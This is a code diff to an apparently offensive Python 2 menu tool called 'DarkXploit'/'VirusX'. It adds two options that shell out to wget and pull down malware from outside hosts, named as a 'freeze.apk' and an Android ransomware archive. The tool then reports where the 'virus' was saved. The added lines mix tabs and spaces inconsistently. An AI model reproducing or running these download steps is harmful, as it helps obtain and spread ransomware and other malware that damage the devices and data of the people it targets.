@@ -52,10 +52,33 @@ def main():
 			print ""+B+"[*]"+N+"Job finished..."
 			print
 			main()
-			
-	############
-    ### VIRUS1 ###
-    ###########
+  elif dr == "01":
+		rez = raw_input(""+R+"Virus"+B+"X > ")
+		if rez == "run":
+			time.sleep(1)
+			print (""+G+"Freeze")
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir freeze;cd freeze;wget http://zumizec-com.waper.co/files/freeze.apk")
+			print
+			print "Now check folder virus on"+R+" /DarkXploit/virus/freeze/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Job finished..."
+			print
+			main()
+  elif dr == "02":
+		dea = raw_input(""+R+"Virus"+B+"X > ")
+		if dea == "run":
+			time.sleep(1)
+			print (""+G+"Ran")
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir android-ransomware;cd android-ransomware;wget http://loolzec.blogwaper.com/files/androidransomware.zip")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/DarkXploit/virus/android-ransomware/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Job finished"
+			print
+			main()
     
   elif dr == "virusx update":
     print ""+G+"~ "+B+"UPDATING..."
